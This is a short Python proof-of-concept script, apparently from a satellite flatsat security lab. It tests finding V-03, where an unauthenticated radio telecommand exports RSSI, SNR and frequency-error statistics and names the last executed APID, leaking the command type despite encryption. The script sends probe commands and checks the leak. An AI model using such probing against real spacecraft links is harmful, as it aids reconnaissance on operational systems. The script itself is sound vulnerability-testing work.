#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-03  Per-TC radio stats exported over an unauthenticated command:
# RSSI/SNR/frequency-error oracle + which APID was just executed.
# SPARTA: RE-0001 / CT-0002 (signal collection)
def main(dev, ev):
    dev.tc(0x20, b"\x01", via="radio")               # reset the window
    for i in range(10):
        dev.tc(0x01, b"", via="radio")               # 10 encrypted PINGs
    tms = dev.tc(0x20, b"", via="radio")             # export
    st = dev.find(tms, 0x20)[0]
    n = st.u8(2)
    avg_r, avg_snr, avg_fe = (struct.unpack("<h", st.payload[3:5])[0],
                              struct.unpack("<h", st.payload[5:7])[0],
                              struct.unpack("<h", st.payload[7:9])[0])
    lo, hi = struct.unpack("<hh", st.payload[9:13])
    last = (st.u8(14) << 8) | st.u8(15)
    ev.log(f"samples={n} rssi avg={avg_r} [{lo}..{hi}] dBm snr={avg_snr/10}dB "
           f"freq_err={avg_fe}Hz crc_on={st.u8(13)} last_apid=0x{last:02X}")
    check(n >= 11, "every uplink TC is sampled")
    check(lo <= avg_r <= hi, "RSSI window consistent")
    check(last == 0x20, "oracle names the APID that just executed -> "
                        "command-type leak despite encrypted payloads")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-03 TC RSSI/SNR oracle + APID leak", main))
